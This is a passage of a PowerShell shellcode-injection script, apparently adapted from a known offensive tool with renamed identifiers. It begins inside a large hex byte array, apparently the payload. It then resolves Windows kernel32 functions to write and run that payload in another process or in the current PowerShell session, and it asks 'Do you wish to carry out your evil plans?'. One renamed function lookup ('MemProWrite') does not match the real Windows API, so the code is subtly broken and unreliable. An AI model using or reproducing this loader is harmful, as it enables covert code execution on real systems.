f,0xcd,0x12,0x62,0xb1,0x68,0x34,0xf3,0xef,0xf2,0x60,0x53,0x7c,0xf0,0xf3,0x87,0x71,0xe6,0xa0,0xeb,0xba,0x4a,0x3d,0xec,0xc6,0x43,0xb,0xde,0xc0,0xe0,0x3a,0xaf,0x13,0x96,0x71,0xb9,0xdf,0x45,0x54,0xf9,0xd,0xe9,0xe4,0x3,0xe8,0xde,0x16,0x2d,0xe,0xfa,0x2,0x4,0x2,0xe6,0xc4,0x57,0x51,0xc4,0x52,0x48,0xf0,0xc7,0xc3,0xfe,0x87,0x93,0x6b,0xfd,0x63,0xd8,0x36,0x93,0xea,0x13,0xa8,0xd4,0x2a,0x41,0xee,0x71,0x69,0x1f,0x19,0x90,0xfd,0x9b,0x7e,0xe,0xe7,0xf,0xc,0x19,0xf7,0x9,0x22,0xc7,0x81,0xe8,0x13,0x16,0x66,0xa5,0x40,0x60,0xca,0x60,0xfa,0x55,0xdc,0x11,0x31,0xce,0x5c,0xa8,0xac,0x9f,0x93,0x67,0xe4,0x94,0xba,0xab,0x6,0xb9,0x8f,0x95,0x5a,0xb0,0xbc,0x7a,0x80,0xf8,0xd,0x7a,0x7e,0x99,0x35,0x4c,0x95,0x12,0x54,0xbb,0x9f,0x4,0x83,0x9b,0x98,0x91,0x26,0x2d,0xc4,0x96,0x99,0x23,0xab,0xf7,0x0,0x49,0xd5,0x70,0x0,0xaf,0x3c,0x91,0xa,0x3b,0x4e,0xb,0x2a,0xc4,0xd2,0x1,0xc7,0x8,0xc9,0xe5,0xe4,0x20,0x25,0x1f,0xd3,0xe4,0xc6,0x76,0x22,0xba,0x4f,0x95,0x86,0x57,0x43,0x2f,0x85,0xc9,0xac,0xeb,0x5,0x69,0xc0,0x2a,0x53,0x6e,0x45,0xc1,0x38,0x36,0xd6,0x45,0xa8,0x55,0x1b,0x32,0xfb,0x26,0xae,0x6a,0x68,0xd6,0xee,0xc7,0x46,0xa0,0xce,0xad,0xad,0x42,0x68,0x9f,0x6d,0x1f,0xab,0xfc,0xbe,0xbb,0xfc,0x24,0xf3,0x8e,0x70,0x47,0x4f,0x85,0xa2,0x15,0x69,0x8,0xca,0x13,0xa4,0x32,0xe5,0x76,0x46,0xee,0x72,0xa5,0xcd,0xf8,0x5e,0x12,0x34,0xc9,0x8,0xe7,0x77,0x2b,0xd1,0xb9,0x11,0x8b,0x45,0xbd,0x33,0xc6,0x49,0x1f,0xe1,0xd,0xad,0xbd,0x5b,0xe0,0xf2,0x97,0xf6,0x83,0x80,0x15,0xe4,0x99,0xa0,0x34,0xb9,0xd1,0x14,0x3,0x14,0x23,0x1,0xc7,0x1,0x63,0x5b,0xb3,0xcb,0xc5,0x36,0x97,0xf3,0x46,0x3e,0xe9,0xea,0x7d,0xf3,0x35,0x4a,0x4a,0x5b,0x62,0xc,0x88,0xcc,0x20,0xcb,0x57,0xca,0xea,0x7b,0x6b,0x8f,0x6b,0xc2,0x58,0x78,0xcd,0xe0,0x82,0x79,0xf7,0xbb,0x7f,0xf1,0x40,0x4c,0xe1,0x2,0x1,0xe2,0x31,0x75,0x71,0x55,0x29,0xdf,0x6,0xa4,0x16,0xb8,0x85,0xd0,0xef,0x75,0x8e,0xe4,0xfa,0xba,0xd9,0xc0,0x5b,0xd4,0x86,0x8e,0xba,0x66,0xc0,0x30,0xc,0xbf,0x31,0xa7,0x6,0x21

    }

    if ( $PSBoundParameters['ProID'] )
    {
       
        $OpenProcessAddr = Get-ProcAddress kernel32.dll OpenProcess
        $OpenProcessDelegate = Get-DelegateType @([UInt32], [Bool], [UInt32]) ([IntPtr])
        $OpenProcess = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($OpenProcessAddr, $OpenProcessDelegate)
        $VirtualAllocExAddr = Get-ProcAddress kernel32.dll VirtualAllocEx
        $VirtualAllocExDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Uint32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAllocEx = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocExAddr, $VirtualAllocExDelegate)
        $WriteProcessMemoryAddr = Get-ProcAddress kernel32.dll MemProWrite
        $WriteProcessMemoryDelegate = Get-DelegateType @([IntPtr], [IntPtr], [Byte[]], [UInt32], [UInt32].MakeByRefType()) ([Bool])
        $MemProWrite = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WriteProcessMemoryAddr, $WriteProcessMemoryDelegate)
        $CreateRemoteThreadAddr = Get-ProcAddress kernel32.dll CreateRemoteThread
        $CreateRemoteThreadDelegate = Get-DelegateType @([IntPtr], [IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateRemoteThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateRemoteThreadAddr, $CreateRemoteThreadDelegate)
        $CloseHandleAddr = Get-ProcAddress kernel32.dll CloseHandle
        $CloseHandleDelegate = Get-DelegateType @([IntPtr]) ([Bool])
        $CloseHandle = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CloseHandleAddr, $CloseHandleDelegate)
    
        Write-Verbose "Injecting Codie into PID: $ProID"
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting Codie injecting into $((Get-Process -Id $ProID).ProcessName) ($ProID)!" ) )
        {
            Injection-CodieRemote $ProID
        }
    }
    else
    {
       
        $VirtualAllocAddr = Get-ProcAddress kernel32.dll VirtualAlloc
        $VirtualAllocDelegate = Get-DelegateType @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])
        $VirtualAlloc = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualAllocAddr, $VirtualAllocDelegate)
        $VirtualFreeAddr = Get-ProcAddress kernel32.dll VirtualFree
        $VirtualFreeDelegate = Get-DelegateType @([IntPtr], [Uint32], [UInt32]) ([Bool])
        $VirtualFree = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($VirtualFreeAddr, $VirtualFreeDelegate)
        $CreateThreadAddr = Get-ProcAddress kernel32.dll CreateThread
        $CreateThreadDelegate = Get-DelegateType @([IntPtr], [UInt32], [IntPtr], [IntPtr], [UInt32], [IntPtr]) ([IntPtr])
        $CreateThread = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($CreateThreadAddr, $CreateThreadDelegate)
        $WaitForSingleObjectAddr = Get-ProcAddress kernel32.dll WaitForSingleObject
        $WaitForSingleObjectDelegate = Get-DelegateType @([IntPtr], [Int32]) ([Int])
        $WaitForSingleObject = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer($WaitForSingleObjectAddr, $WaitForSingleObjectDelegate)
        
        Write-Verbose "Injecting Codie into PowerShell"
        
        if ( $Force -or $psCmdlet.ShouldContinue( 'Do you wish to carry out your evil plans?',
                 "Injecting Codie into the running PowerShell process!" ) )
        {
            Injection-CodieLocal
        }
    }   
}
